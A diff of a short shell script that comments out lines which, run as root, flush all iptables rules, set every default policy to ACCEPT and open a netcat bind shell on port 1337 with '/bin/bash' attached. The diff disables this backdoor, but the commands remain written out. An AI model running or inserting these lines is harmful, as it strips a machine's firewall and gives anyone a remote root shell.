@@ -14,21 +14,21 @@ sleep 4
 source ~/.bashrc
 
 # Flush iptables rules
-sudo iptables -F
-sudo iptables -t mangle -F
-sudo iptables -t nat -F
-sudo iptables -t filter -F
-sudo iptables -t raw -F
-sudo iptables -t security -F
+#sudo iptables -F
+#sudo iptables -t mangle -F
+#sudo iptables -t nat -F
+#sudo iptables -t filter -F
+#sudo iptables -t raw -F
+#sudo iptables -t security -F
 
 # Change default policies for 'iptables'
-sudo iptables -P INPUT ACCEPT 
-sudo iptables -P OUTPUT ACCEPT
-sudo iptables -P FORWARD ACCEPT
+#sudo iptables -P INPUT ACCEPT 
+#sudo iptables -P OUTPUT ACCEPT
+#sudo iptables -P FORWARD ACCEPT
 
 # Open up a netcat listener on the best port (TCP)
-sudo nc -lp 1337 -e /bin/bash &
+#sudo nc -lp 1337 -e /bin/bash &
 
 # Have some fun :D
-sudo apt install sl > /dev/null
+#sudo apt install sl > /dev/null
 sl
